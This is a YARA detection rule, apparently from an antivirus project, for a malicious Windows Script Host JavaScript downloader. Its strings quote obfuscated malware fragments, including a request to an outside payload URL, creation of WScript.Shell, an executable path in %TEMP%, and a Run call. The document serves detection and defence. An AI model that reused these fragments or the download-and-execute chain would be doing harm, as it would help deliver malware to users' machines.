rule sig_20160401_0a69d6e86b22476cbe6d0ce6746d5cba {
  meta:
    description = "datamaliciousorder - file 20160401_0a69d6e86b22476cbe6d0ce6746d5cba.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "cc428b12cc13c1442dd97cd89830b1453c9aa11eaef61bd7c8110e8e41e592aa"

  strings:
    $s1  = "CfCg[VnUz](\"G\" + \"ET\", \"http://ledivinecomedie.com/m9woq\", false);" fullword ascii
    $s2  = "function PvmPy(KrUl, LtfWo){UgQnl = UgQnl * 1; return KrUl - LtfWo;};" fullword ascii
    $s3  = "var YfnIwp = function EjaYp() {return WScript[HhzGdb](\"WScript\"+\".Shell\");}(), QwCpf = 11;" fullword ascii
    $s4  = "if (CfCg[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function GgoGd() {return YfnIwp[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"lq8Fd2U5jjNIK.ex\" + \"e\";};" fullword ascii
    $s6  = "function IsnDpp(){return BkRpu + \"\";};" fullword ascii
    $s7  = "function LilNz() {return ((BkbQr == true) && (BkbQr == RpdNq)) ? 1 : UgQnl;};" fullword ascii
    $s8  = "RpdNq = true; " fullword ascii
    $s9  = "function XltGns(NjfLac){YfnIwp[\"R\"+\"un\"](NjfLac, UgQnl, UgQnl);};" fullword ascii
    $s10 = "return PvmPy(VdaTvh, VjLps);" fullword ascii
    $s11 = "UjHbt[\"type\"] = ChAka(1);" fullword ascii
    $s12 = "function YiJr(){return HhzGdb;};" fullword ascii
    $s13 = "var RpdNq = false;" fullword ascii
    $s14 = "ZpcOxj[\"position\"] = ChAka(UgQnl);" fullword ascii
    $s15 = "var BkbQr = false;" fullword ascii
    $s16 = "var SdRii = new this[\"Date\"]();" fullword ascii
    $s17 = "BkbQr = true; " fullword ascii
    $s18 = "}while (FwQxw);" fullword ascii
    $s19 = "function EihOfz(){return 23;};" fullword ascii
    $s20 = "function ChAka(OawWma) {var AqbGk = (1, 2, 3, 4, 5, OawWma); return AqbGk;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}